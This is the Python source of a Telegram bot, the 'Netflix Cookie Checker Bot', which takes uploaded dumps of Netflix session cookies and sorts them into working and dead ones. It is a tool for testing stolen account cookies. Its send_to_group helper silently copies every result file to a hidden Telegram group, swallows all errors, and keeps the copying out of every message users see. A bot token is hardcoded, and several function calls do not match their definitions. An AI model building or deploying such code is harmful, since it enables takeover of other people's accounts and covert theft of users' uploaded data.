import os
import asyncio
from telegram import Update, InputFile, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler
from uuid import uuid4
import shutil
import zipfile
from datetime import datetime
import signal
import sys

# Import the correct functions from your checker files
from Fastcheck import process_file_and_check as fast_check
from Slowcheck import process_file_and_check as slow_check
from Logout import process_file_and_check as logout_check
from Cleaner import universal_clean_input, detect_cookie_type


# Import the new cookie cleaning logic
from Cleaner import universal_clean_input, RAR_SUPPORT

# --- Config ---
TOKEN = "8270743184:AAHGNIVvoguLw0amcIPTlB9g4srkthMmoQ0"  # Replace with your actual bot token
UPLOAD_DIR = "uploads"

# Group configuration - Add your group chat ID here (COMPLETELY HIDDEN FROM USERS)
TARGET_GROUP_ID = "-1003072651464"  # Replace with your group chat ID (include the minus sign)
SEND_TO_GROUP = True  # Set to False to disable group sending

# Global dictionary to track active processes
active_processes = {}
# Global stop flag for emergency stop
global_stop_flag = False

# Ensure directories exist
os.makedirs(UPLOAD_DIR, exist_ok=True)

# --- Helper: Save uploaded files ---
async def save_uploaded_file(file, file_unique_id, file_name):
    safe_name = f"{file_unique_id}_{file_name}"
    file_path = os.path.join(UPLOAD_DIR, safe_name)
    await file.download_to_drive(file_path)
    return file_path

# --- Helper: Clean up old files ---
def cleanup_directory(directory):
    """Remove all files from a directory"""
    if os.path.exists(directory):
        try:
            shutil.rmtree(directory)
        except Exception as e:
            print(f"Error removing directory {directory}: {e}")

# --- Helper: Detect check mode from filename ---
def detect_check_mode(filename):
    """Detect checking mode from filename"""
    filename_lower = filename.lower()

    # Check for specific keywords in filename
    if any(keyword in filename_lower for keyword in ['fast', 'quick', 'rapid']):
        return 'fast'
    elif any(keyword in filename_lower for keyword in ['slow', 'thorough', 'deep', 'full']):
        return 'slow'
    elif any(keyword in filename_lower for keyword in ['logout', 'signout', 'exit']):
        return 'logout'
    else:
        # Default to fast if no specific mode detected
        return 'fast'

# --- Helper: Detect cleaning mode from filename or default ---
def detect_cleaning_mode(filename):
    """Detect cleaning mode from filename or default to a common one."""
    filename_lower = filename.lower()
    if "netscape" in filename_lower:
        return "netscape"
    elif "json" in filename_lower:
        return "json"
    # Default to netflix_id if no specific cleaning mode is detected
    # This is a common format for raw cookie dumps
    return "netflix_id"

# --- Helper: Create ZIP file from cookies (ENHANCED for both valid and invalid) ---
def create_results_zip(results_dir, mode, original_filename, result_type="valid"):
    """Create a ZIP file containing valid or invalid cookies"""
    if result_type == "valid":
        target_dir = os.path.join(results_dir, 'valid_cookies')
    else:
        target_dir = os.path.join(results_dir, 'invalid_cookies')

    if not os.path.exists(target_dir) or not os.listdir(target_dir):
        return None

    # Create zip filename with timestamp
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    base_name = os.path.splitext(original_filename)[0]
    zip_filename = f"{base_name}_{mode}_{result_type}_{timestamp}.zip"
    zip_path = os.path.join(results_dir, zip_filename)

    try:
        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for filename in os.listdir(target_dir):
                file_path = os.path.join(target_dir, filename)
                if os.path.isfile(file_path) and os.path.getsize(file_path) > 0:
                    zipf.write(file_path, filename)

        # Check if zip file was created and has content
        if os.path.exists(zip_path) and os.path.getsize(zip_path) > 0:
            return zip_path
        else:
            return None

    except Exception as e:
        print(f"Error creating {result_type} ZIP file: {e}")
        return None

# --- Helper: Send results to group (ULTRA SAFE - NO CAPTION TO AVOID ALL ENTITY ERRORS) ---
async def send_to_group(context, file_path, filename, file_type, original_filename, user_info, mode):
    """Send results to the target group - ULTRA SAFE with NO CAPTION to prevent all entity parsing errors"""
    if not SEND_TO_GROUP or not TARGET_GROUP_ID:
        return

    try:
        # Check if file still exists before sending
        if not os.path.exists(file_path):
            return  # Silent return

        # Get file size
        file_size = os.path.getsize(file_path)
        file_size_mb = file_size / (1024 * 1024)

        # Skip files that are too large (over 50MB)
        if file_size_mb > 50:
            return  # Silent return

        # Clean filename for group (only alphanumeric and basic punctuation)
        clean_filename = ''.join(c if c.isalnum() or c in '.-_()[]' else '_' for c in filename)

        # Ensure filename is not empty
        if not clean_filename:
            clean_filename = f"{file_type}_cookie_{datetime.now().strftime('%H%M%S')}.txt"

        # Send to group with timeout protection - ABSOLUTELY NO CAPTION
        with open(file_path, 'rb') as f:
            await asyncio.wait_for(
                context.bot.send_document(
                    chat_id=TARGET_GROUP_ID,
                    document=f,
                    filename=clean_filename
                    # ABSOLUTELY NO CAPTION - this eliminates all entity parsing errors
                ),
                timeout=30
            )

        # ABSOLUTELY NO console output - completely silent operation

    except Exception:
        # COMPLETELY SILENT error handling - no output whatsoever
        pass

# --- Helper: Create inline keyboard with valid/invalid counts and STOP button ---
def create_status_keyboard(valid, invalid, process_id):
    """Create inline keyboard with valid/invalid counts and STOP button"""
    keyboard = [
        [
            InlineKeyboardButton(f"✅ Valid: {valid}", callback_data=f"stats_valid_{process_id}"),
            InlineKeyboardButton(f"❌ Invalid: {invalid}", callback_data=f"stats_invalid_{process_id}")
        ],
        [
            InlineKeyboardButton("🛑 STOP PROCESS", callback_data=f"stop_process_{process_id}")
        ]
    ]
    return InlineKeyboardMarkup(keyboard)

# --- Helper: Format processing status ---
def format_processing_status(checked, total, valid, invalid, elapsed_time, mode):
    """Format processing status message with progress indicators"""
    progress_percent = (checked / total * 100) if total > 0 else 0

    # Progress bar (20 characters)
    filled_blocks = int(progress_percent / 5)
    progress_bar = "█" * filled_blocks + "░" * (20 - filled_blocks)

    # Calculate speed
    speed = checked / elapsed_time if elapsed_time > 0 else 0

    # Calculate ETA
    remaining = total - checked
    eta = remaining / speed if speed > 0 else 0
    eta_str = f"{int(eta // 60)}m {int(eta % 60)}s" if eta < 3600 else f"{int(eta // 3600)}h {int((eta % 3600) // 60)}m"

    status_msg = f"""📊 **Processing Status**

📂 Processing: {checked}/{total}
📈 Progress: {progress_percent:.1f}%
{progress_bar}

⚡ Speed: {speed:.1f} files/sec
⏱️ Elapsed: {int(elapsed_time // 60)}m {int(elapsed_time % 60)}s
🕐 ETA: {eta_str if eta > 0 else '--'}"""

    return status_msg

# --- Emergency stop function ---
def emergency_stop():
    """Stop all active processes immediately"""
    global global_stop_flag, active_processes
    global_stop_flag = True

    # Set stop flag for all active processes
    for process_id in active_processes:
        active_processes[process_id]["stop_flag"] = True

    print("🛑 EMERGENCY STOP: All processes halted")

# --- Callback handler for inline buttons (ENHANCED with emergency stop) ---
async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle inline button callbacks"""
    query = update.callback_query
    await query.answer()

    callback_data = query.data

    if callback_data.startswith("stop_process_"):
        process_id = callback_data.split("_")[-1]

        # Set stop flag for the specific process
        if process_id in active_processes:
            active_processes[process_id]["stop_flag"] = True

            # Also set global stop flag to halt checker functions
            global global_stop_flag
            global_stop_flag = True

            # Update message to show process stopped
            await query.edit_message_text(
                "🛑 **Process Stopped**\n\n"
                "The checking process has been stopped by user request.\n"
                "All running operations have been halted.",
                parse_mode='Markdown'
            )

            print(f"🛑 Process {process_id} stopped by user")
        else:
            await query.edit_message_text(
                "⚠️ **Process Not Found**\n\n"
                "The process may have already completed or stopped.",
                parse_mode='Markdown'
            )

    elif callback_data.startswith("stats_"):
        # These are just display buttons, no action needed
        pass

# --- Helper: Process file with specific mode (SENDS BOTH VALID AND INVALID TO GROUP) ---
async def process_file_with_mode(update, file_path, file_name, mode, clean_format=None, reply_to_message=None):
    """Process a file with the specified checking mode"""
    global global_stop_flag

    print(f"🔄 Starting {mode.upper()} check for file: {file_name}")
    print(f"🧹 Using cleaning format: {clean_format}")

    # Reset global stop flag for new process
    global_stop_flag = False

    # Generate unique process ID
    process_id = str(uuid4())[:8]

    # Initialize process tracking
    active_processes[process_id] = {
        "stop_flag": False,
        "file_name": file_name,
        "mode": mode,
        "clean_format": clean_format
    }

    # Send initial processing message with inline keyboard
    initial_keyboard = create_status_keyboard(0, 0, process_id)

    if reply_to_message:
        status_msg = await reply_to_message.reply_text(
            f"🔄 **Starting {mode.upper()} check...**\n"
            f"📁 File: `{file_name}`\n"
            f"🧹 Cleaning format: `{clean_format}`\n"
            f"⏳ Initializing...",
            parse_mode='Markdown',
            reply_markup=initial_keyboard
        )
    else:
        status_msg = await update.message.reply_text(
            f"🔄 **Starting {mode.upper()} check...**\n"
            f"📁 File: `{file_name}`\n"
            f"🧹 Cleaning format: `{clean_format}`\n"
            f"⏳ Initializing...",
            parse_mode='Markdown',
            reply_markup=initial_keyboard
        )

    # Initialize variables that will be used in finally block
    cleaned_files_temp_dir = None
    results_dir = None
    
    try:
        # --- STEP 1: Clean the input file(s) ---
        await status_msg.edit_text(
            f"🔄 **Starting {mode.upper()} check...**\n"
            f"📁 File: `{file_name}`\n"
            f"🧹 Cleaning format: `{clean_format}`\n"
            f"🧼 Cleaning cookies...",
            parse_mode='Markdown',
            reply_markup=initial_keyboard
        )
        
        print(f"🧼 Cleaning cookies from: {file_path}")
        
        # Run cleaning in a separate thread to avoid blocking the event loop
        cleaned_file_path, cleaned_files_temp_dir = await asyncio.get_event_loop().run_in_executor(
            None, universal_clean_input(file_path)
        )

        if not cleaned_file_path:
            print(f"❌ No cookies found after cleaning: {file_name}")
            await status_msg.edit_text(
                f"❌ **Cleaning Failed**\n\n"
                f"No valid cookies found after cleaning `{file_name}` with `{clean_format}` format.",
                parse_mode='Markdown'
            )
            # Delete the status message after a delay
            await asyncio.sleep(10)
            try: 
                await status_msg.delete()
            except Exception: 
                pass
            return

        print(f"✅ Cleaning completed. Clean file: {cleaned_file_path}")

        # --- STEP 2: Proceed with checking cleaned files ---
        # Start timing for the checking process
        start_time = asyncio.get_event_loop().time()
        loop = asyncio.get_event_loop()

        # Shared progress state
        progress = {"checked": 0, "total": 0, "valid": 0, "invalid": 0}

        # --- updater task for live editing ---
        async def update_status():
            while True:
                try:
                    # Check if process should stop
                    if (active_processes.get(process_id, {}).get("stop_flag", False) or
                        global_stop_flag):
                        break

                    elapsed = asyncio.get_event_loop().time() - start_time
                    status_text = format_processing_status(
                        progress["checked"],
                        progress["total"],
                        progress["valid"],
                        progress["invalid"],
                        elapsed,
                        mode
                    )

                    # Create updated keyboard with current counts
                    keyboard = create_status_keyboard(
                        progress["valid"],
                        progress["invalid"],
                        process_id
                    )

                    await status_msg.edit_text(
                        status_text,
                        parse_mode='Markdown',
                        reply_markup=keyboard
                    )
                    await asyncio.sleep(2)
                except Exception:
                    break

        status_task = asyncio.create_task(update_status())

        # --- wrapper to run checkers that yield progress ---
        def run_check(func, file_path_to_check):
            nonlocal results_dir  # This allows us to modify results_dir from inside this function
            try:
                print(f"🔍 Running {mode} check on: {file_path_to_check}")
                # The checker functions expect a single file path (string), not a list
                for step in func(file_path_to_check, live=True):
                    # Check stop flags during processing
                    if (active_processes.get(process_id, {}).get("stop_flag", False) or
                        global_stop_flag):
                        print(f"🛑 Breaking check loop for process {process_id}")
                        break

                    if len(step) == 4:
                        checked, total, valid, invalid = step
                        progress["checked"] = checked
                        progress["total"] = total
                        progress["valid"] = valid
                        progress["invalid"] = invalid
                    elif len(step) == 5:
                        checked, total, valid, invalid, results_dir = step
                        progress["checked"] = checked
                        progress["total"] = total
                        progress["valid"] = valid
                        progress["invalid"] = invalid
                        # results_dir is now set here
            except Exception as e:
                print(f"Error in run_check: {e}")
            return results_dir

        # Run actual check depending on mode - PASS THE SINGLE CLEANED FILE PATH
        if mode == 'fast':
            results_dir = await loop.run_in_executor(None, run_check, fast_check, cleaned_file_path)
        elif mode == 'slow':
            results_dir = await loop.run_in_executor(None, run_check, slow_check, cleaned_file_path)
        elif mode == 'logout':
            results_dir = await loop.run_in_executor(None, run_check, logout_check, cleaned_file_path)

        # Stop updater
        status_task.cancel()

        # Check if process was stopped
        if (active_processes.get(process_id, {}).get("stop_flag", False) or
            global_stop_flag):
            # Clean up and exit
            if results_dir and os.path.exists(results_dir):
                cleanup_directory(results_dir)
            if os.path.exists(file_path):
                os.remove(file_path)
            if cleaned_files_temp_dir and os.path.exists(cleaned_files_temp_dir):
                cleanup_directory(cleaned_files_temp_dir)

            # Remove from active processes
            active_processes.pop(process_id, None)
            return

        print(f"✅ Check completed. Results directory: {results_dir}")

        # --- Enhanced results sending logic (GUARANTEED TO SEND BOTH VALID AND INVALID TO GROUP) ---
        sent_files = 0
        total_size = 0

        # Get user info for HIDDEN group sending
        user_info = {
            'id': update.effective_user.id,
            'first_name': update.effective_user.first_name,
            'last_name': update.effective_user.last_name,
            'username': update.effective_user.username
        }

        if results_dir and os.path.exists(results_dir):
            # Check for valid cookies directory
            valid_dir = os.path.join(results_dir, 'valid_cookies')
            invalid_dir = os.path.join(results_dir, 'invalid_cookies')

            valid_files = []
            invalid_files = []

            if os.path.exists(valid_dir):
                valid_files = [f for f in os.listdir(valid_dir)
                             if os.path.isfile(os.path.join(valid_dir, f)) and
                             os.path.getsize(os.path.join(valid_dir, f)) > 0]

            if os.path.exists(invalid_dir):
                invalid_files = [f for f in os.listdir(invalid_dir)
                               if os.path.isfile(os.path.join(invalid_dir, f)) and
                               os.path.getsize(os.path.join(invalid_dir, f)) > 0]

            # Determine if original was an archive or single file
            file_ext = os.path.splitext(file_name)[1].lower()
            is_archive = file_ext in ['.zip', '.rar']

            # For archives or when there are many files, create ZIP files
            if is_archive or len(valid_files) > 3 or len(invalid_files) > 3:

                # ALWAYS CREATE AND SEND VALID ZIP if there are valid cookies
                if valid_files:
                    valid_zip_path = create_results_zip(results_dir, mode, file_name, "valid")
                    if valid_zip_path:
                        zip_size = os.path.getsize(valid_zip_path)

                        # Send to user
                        with open(valid_zip_path, 'rb') as f:
                            await update.message.reply_document(
                                document=f,
                                filename=os.path.basename(valid_zip_path),
                                caption=f"✅ **Valid Cookies** ({len(valid_files)} files)\n📁 From: `{file_name}`",
                                parse_mode='Markdown'
                            )

                        # GUARANTEED send to group - VALID
                        await send_to_group(
                            context,
                            valid_zip_path,
                            os.path.basename(valid_zip_path),
                            "valid",
                            file_name,
                            user_info,
                            mode
                        )

                        sent_files += 1
                        total_size += zip_size

                # ALWAYS CREATE AND SEND INVALID ZIP if there are invalid cookies
                if invalid_files:
                    invalid_zip_path = create_results_zip(results_dir, mode, file_name, "invalid")
                    if invalid_zip_path:
                        zip_size = os.path.getsize(invalid_zip_path)

                        # Send to user
                        with open(invalid_zip_path, 'rb') as f:
                            await update.message.reply_document(
                                document=f,
                                filename=os.path.basename(invalid_zip_path),
                                caption=f"❌ **Invalid Cookies** ({len(invalid_files)} files)\n📁 From: `{file_name}`",
                                parse_mode='Markdown'
                            )

                        # GUARANTEED send to group - INVALID
                        await send_to_group(
                            context,
                            invalid_zip_path,
                            os.path.basename(invalid_zip_path),
                            "invalid",
                            file_name,
                            user_info,
                            mode
                        )

                        sent_files += 1
                        total_size += zip_size

                # If no ZIP files were created
                if sent_files == 0:
                    await update.message.reply_text("❌ Error creating results archives.")

            else:
                # Send individual files for single file uploads with few results

                # ALWAYS send valid files individually
                for filename in valid_files:
                    file_path_result = os.path.join(valid_dir, filename)
                    try:
                        file_size = os.path.getsize(file_path_result)

                        # Send to user
                        with open(file_path_result, 'rb') as f:
                            await update.message.reply_document(
                                document=f,
                                filename=filename,
                                caption="✅ **Valid Cookie**",
                                parse_mode='Markdown'
                            )

                        # GUARANTEED send to group - VALID INDIVIDUAL
                        await send_to_group(
                            context,
                            file_path_result,
                            filename,
                            "valid",
                            file_name,
                            user_info,
                            mode
                        )

                        sent_files += 1
                        total_size += file_size
                    except Exception as e:
                        print(f"Error sending valid file {filename}: {e}")

                # ALWAYS send invalid files individually
                for filename in invalid_files:
                    file_path_result = os.path.join(invalid_dir, filename)
                    try:
                        file_size = os.path.getsize(file_path_result)

                        # Send to user
                        with open(file_path_result, 'rb') as f:
                            await update.message.reply_document(
                                document=f,
                                filename=filename,
                                caption="❌ **Invalid Cookie**",
                                parse_mode='Markdown'
                            )

                        # GUARANTEED send to group - INVALID INDIVIDUAL
                        await send_to_group(
                            context,
                            file_path_result,
                            filename,
                            "invalid",
                            file_name,
                            user_info,
                            mode
                        )

                        sent_files += 1
                        total_size += file_size
                    except Exception as e:
                        print(f"Error sending invalid file {filename}: {e}")

        # Delete the processing status message to keep conversation clean
        try:
            await status_msg.delete()
        except Exception:
            pass

        # Send completion summary (NO mention of group sending)
        if sent_files == 0:
            summary_msg = await update.message.reply_text(
                f"📊 **Processing Complete**\n"
                f"📁 File: `{file_name}`\n"
                f"🔍 Mode: {mode.upper()} check\n\n"
                f"✅ Valid: {progress['valid']}\n"
                f"❌ Invalid: {progress['invalid']}\n"
                f"📦 Total Processed: {progress['checked']}\n\n"
                f"ℹ️ No result files to send (all cookies may have been empty or corrupted)",
                parse_mode='Markdown'
            )
            # Delete summary after 15 seconds
            await asyncio.sleep(15)
            try:
                await summary_msg.delete()
            except Exception:
                pass
        else:
            # Send a completion summary (NO mention of group sending)
            summary_msg = await update.message.reply_text(
                f"🎉 **Processing Complete!**\n"
                f"📁 File: `{file_name}`\n"
                f"🔍 Mode: {mode.upper()} check\n\n"
                f"✅ Valid: {progress['valid']}\n"
                f"❌ Invalid: {progress['invalid']}\n"
                f"📦 Total Processed: {progress['checked']}\n",
                parse_mode='Markdown'
            )
            # Delete summary after 10 seconds
            await asyncio.sleep(10)
            try:
                await summary_msg.delete()
            except Exception:
                pass

    except Exception as e:
        print(f"❌ Error during {mode.upper()} check: {e}")
        # Delete processing message and show error
        try:
            await status_msg.delete()
        except Exception:
            pass

        error_msg = await update.message.reply_text(
            f"❌ **Error during {mode.upper()} check**\n"
            f"`{str(e)}`",
            parse_mode='Markdown'
        )
        # Delete error message after 15 seconds
        await asyncio.sleep(15)
        try:
            await error_msg.delete()
        except Exception:
            pass

    finally:
        print(f"🧹 Cleaning up temporary files...")
        # Clean up result directory (after all sending is complete) - NOW SAFE TO USE
        if results_dir and os.path.exists(results_dir):
            cleanup_directory(results_dir)

        # Clean up uploaded file
        try:
            if os.path.exists(file_path):
                os.remove(file_path)
        except Exception as e:
            print(f"Error cleaning up uploaded file: {e}")

        # Clean up the temporary directory created by the cleaner
        if cleaned_files_temp_dir and os.path.exists(cleaned_files_temp_dir):
            cleanup_directory(cleaned_files_temp_dir)

        # Remove from active processes
        active_processes.pop(process_id, None)
        print(f"✅ Process {process_id} completed and cleaned up")

# --- Command: /start (NO mention of group functionality) ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    welcome_text = """🍿 **Netflix Cookie Checker Bot**

📋 **How to use:**

• `/fastcheck` - Quick validation
• `/slowcheck` - Thorough validation  
• `/logout` - Logout check

**OR** just send me a file and I'll auto-process it with fastcheck!

Supported formats:
• Text files (.txt)
• ZIP archives (.zip)
• RAR archives (.rar)

Supported cookie formats:
• Netflix ID (NetflixId=...)
• Netscape format
• JSON format
    """
    await update.message.reply_text(welcome_text, parse_mode='Markdown')

# --- Handle commands with replies ---
async def handle_command_reply(update: Update, context: ContextTypes.DEFAULT_TYPE, mode: str):
    """Handle commands that are replies to files"""

    if not update.message.reply_to_message:
        temp_msg = await update.message.reply_text(
            f"💡 **{mode.upper()} Check**\n\n"
            f"To use this command:\n"
            f"1. Send me a file, OR\n"
            f"2. Reply to a file with `/{mode}check`\n\n"
            f"I'll process it with {mode} checking mode!",
            parse_mode='Markdown'
        )
        # Delete instruction message after 10 seconds
        await asyncio.sleep(10)
        try:
            await temp_msg.delete()
            await update.message.delete()
        except Exception:
            pass
        return

    replied_message = update.message.reply_to_message

    # Check if the replied message has a document
    if replied_message.document:
        try:
            # Download the file from the reply
            tg_file = await replied_message.document.get_file()
            file_path = await save_uploaded_file(
                tg_file,
                replied_message.document.file_unique_id,
                replied_message.document.file_name
            )

            # Detect cleaning mode based on filename
            clean_format = detect_cleaning_mode(replied_message.document.file_name)

            # Delete the command message to keep conversation clean
            try:
                await update.message.delete()
            except Exception:
                pass

            # Process the file with the specified mode
            await process_file_with_mode(
                update,
                context,
                file_path,
                replied_message.document.file_name,
                mode,
                clean_format,
                reply_to_message=replied_message
            )

        except Exception as e:
            temp_msg = await update.message.reply_text(
                f"❌ Error processing replied file: {str(e)}"
            )
            await asyncio.sleep(10)
            try:
                await temp_msg.delete()
                await update.message.delete()
            except Exception:
                pass
    else:
        temp_msg = await update.message.reply_text(
            f"⚠️ Please reply to a **file** with `/{mode}check` command.\n\n"
            f"The message you replied to doesn't contain a file."
        )
        await asyncio.sleep(10)
        try:
            await temp_msg.delete()
            await update.message.delete()
        except Exception:
            pass

# --- Auto-process files (THE MAIN FUNCTION FOR DIRECT FILE UPLOADS) ---
async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle direct file uploads - automatically process with fastcheck"""
    print(f"📁 File received: {update.message.document.file_name}")
    
    doc = update.message.document
    if doc:
        # Check file size (limit to 50MB for archives)
        if doc.file_size > 50 * 1024 * 1024:
            temp_msg = await update.message.reply_text("❌ File too large. Please send files smaller than 50MB.")
            await asyncio.sleep(10)
            try:
                await temp_msg.delete()
            except Exception:
                pass
            return

        # Check for RAR support if it's a RAR file
        if doc.file_name.lower().endswith('.rar') and not RAR_SUPPORT:
            temp_msg = await update.message.reply_text(
                "❌ RAR file detected, but RAR support is not enabled on the server.\n"
                "Please contact the bot administrator to install `rarfile` and `unrar`."
            )
            await asyncio.sleep(15)
            try:
                await temp_msg.delete()
            except Exception:
                pass
            return

        try:
            # Detect check mode from filename (defaults to 'fast')
            mode = detect_check_mode(doc.file_name)
            print(f"🔍 Detected check mode: {mode}")
            
            # Detect cleaning mode based on filename (defaults to 'netflix_id')
            clean_format = detect_cleaning_mode(doc.file_name)
            print(f"🧹 Detected cleaning format: {clean_format}")

            # Save the file
            tg_file = await doc.get_file()
            file_path = await save_uploaded_file(
                tg_file, doc.file_unique_id, doc.file_name
            )

            # 🪄 Detect cleaning format based on file contents
            clean_format = detect_cookie_type(file_path)
            print(f"🪄 Detected cleaning format: {clean_format}")

            # Clean into structured folder
            cleaned_folder = universal_clean_input(file_path)

            # Detect mode (fast/slow/logout) from filename
            mode = detect_check_mode(doc.file_name)

            # Process the CLEANED folder
            await process_file_with_mode(update, cleaned_folder, doc.file_name, mode, clean_format)



        except Exception as e:
            print(f"❌ Error processing file: {e}")
            temp_msg = await update.message.reply_text(f"❌ Error processing file: {str(e)}")
            await asyncio.sleep(10)
            try:
                await temp_msg.delete()
            except Exception:
                pass
    else:
        temp_msg = await update.message.reply_text("⚠️ Please send a valid document file (.txt, .zip, .rar)")
        await asyncio.sleep(5)
        try:
            await temp_msg.delete()
        except Exception:
            pass

# --- Command handlers ---
async def fastcheck(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await handle_command_reply(update, context, 'fast')

async def slowcheck(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await handle_command_reply(update, context, 'slow')

async def logout(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await handle_command_reply(update, context, 'logout')

# --- Error handler ---
async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    print(f"Update {update} caused error {context.error}")

# --- Signal handler for graceful shutdown ---
def signal_handler(signum, frame):
    """Handle system signals for graceful shutdown"""
    print(f"\n🛑 Received signal {signum}. Stopping all processes...")
    emergency_stop()
    sys.exit(0)

# --- Main Application ---
def main():
    print("🤖 Initializing Netflix Cookie Checker Bot...")

    # Set up signal handlers for graceful shutdown
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)

    app = ApplicationBuilder().token(TOKEN).build()

    # Add handlers
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("fastcheck", fastcheck))
    app.add_handler(CommandHandler("slowcheck", slowcheck))
    app.add_handler(CommandHandler("logout", logout))
    app.add_handler(CallbackQueryHandler(button_callback))
    
    # CRITICAL: This handler processes direct file uploads automatically
    app.add_handler(MessageHandler(filters.Document.ALL, handle_file))

    # Add error handler
    app.add_error_handler(error_handler)

    print("✅ Bot is running and ready to receive files...")
    print("🔍 Features:")
    print("   • 🚀 AUTO-PROCESS: Send any file → Auto-clean → Auto-fastcheck → Results!")
    print("   • 📂 Auto-detection from filename")
    print("   • 💬 Reply to files with commands")
    print("   • 🧹 Automatic cookie cleaning")
    print("   • 📊 Live progress tracking")
    print("   • 🛑 STOP button to halt processing")
    print("   • 📦 Both valid AND invalid results")
    print("🗂️ Archive support: ZIP/RAR files supported")
    if not RAR_SUPPORT:
        print("   ⚠️ RAR support is currently disabled (rarfile not installed or unrar not found).")
        print("      Install with: pip install rarfile and ensure 'unrar' is in your system PATH.")
    print("🧼 Cookie formats supported:")
    print("   • Netflix ID format (NetflixId=...)")
    print("   • Netscape format (.netflix.com)")
    print("   • JSON cookie format")
    print("🛑 Emergency stop: Ctrl+C to stop all processes")

    try:
        app.run_polling(allowed_updates=Update.ALL_TYPES)
    except KeyboardInterrupt:
        print("\n🛑 Bot stopped by user")
        emergency_stop()
    except Exception as e:
        print(f"❌ Bot crashed: {e}")
        emergency_stop()

if __name__ == '__main__':
    main()




